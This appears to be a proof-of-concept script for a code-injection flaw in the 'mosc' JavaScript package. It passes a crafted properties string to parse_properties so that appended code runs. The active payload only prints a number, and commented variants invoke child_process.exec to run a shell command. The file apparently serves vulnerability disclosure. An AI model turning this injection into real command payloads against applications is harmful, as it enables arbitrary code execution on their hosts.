var A = require("mosc");
var a = new A({});
var key = "";
// var attack_code = "fs=require('fs');console.log('123');"
var attack_code = " console.log(123);";
// var attack_code = 'require("child_process").exec("touch attack");'
var properties = "{a:*1*; " + attack_code + " //*}"
var base ="";

var a = a.parse_properties(key,properties,{},{})
